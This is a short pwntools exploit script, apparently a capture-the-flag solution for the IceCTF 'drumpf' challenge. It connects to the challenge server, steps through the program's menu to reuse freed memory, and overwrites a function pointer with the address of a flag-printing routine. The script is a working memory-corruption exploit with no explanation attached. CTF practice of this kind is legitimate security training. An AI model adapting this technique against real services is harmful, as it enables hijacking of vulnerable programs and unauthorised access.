#!/bin/python2
from pwn import *

HOST = 'drumpf.vuln.icec.tf'
PORT = 6502
FLAG = 0x804863d

def resp(r, msg, post='$$$ '):
    r.recvuntil(post)
    log.info('Sended: %s' % repr(msg))
    r.send(msg + '\n')

r = remote(HOST, PORT)
# r = gdb.debug(['./drumpf_eb9f02ed8dfc8aed3e311f4bc7aea372a403f184ccd568828eb0a99b3559a50c'])
resp(r, '1')
resp(r, 'CCCC', post=': ')
resp(r, str(0x41414141), post=': ')
resp(r, '3')
resp(r, '2')
resp(r, 'BBBB', post=': ')
resp(r, str(FLAG), post=': ')
resp(r, '4')
print r.recvline()
